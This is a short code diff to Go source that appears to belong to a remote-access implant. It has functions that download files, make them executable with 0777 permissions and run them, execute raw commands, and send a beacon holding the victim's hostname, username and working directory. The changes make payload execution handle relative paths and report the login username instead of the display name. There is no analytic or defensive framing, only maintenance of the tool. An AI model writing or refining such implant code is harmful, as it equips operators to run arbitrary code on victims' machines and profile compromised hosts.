@@ -129,8 +129,13 @@ func downloadFile(filepath string, url string) (err error) {
 }
 
 func execute_file(c string, args[]string){
-    os.Chmod(c, os.FileMode(int(0777)) )
-    execute(c, args)
+    f := c
+    if !path.IsAbs(c){
+      cwd, _ := os.Getwd()
+      f = path.Join(cwd, f)
+    }
+    os.Chmod(f, os.FileMode(int(0777)) )
+    execute(f, args)
 }
 
 func execute_raw(c string, args []string) ([]byte){
@@ -170,7 +175,7 @@ func get_beacon() url.Values {
     var timestamp int32
     timestamp = int32(time.Now().Unix())
 
-    return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Name}, "cwd":{dir}}
+    return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Username}, "cwd":{dir}}
 }
 
 // Convert key, value strings to url.Values
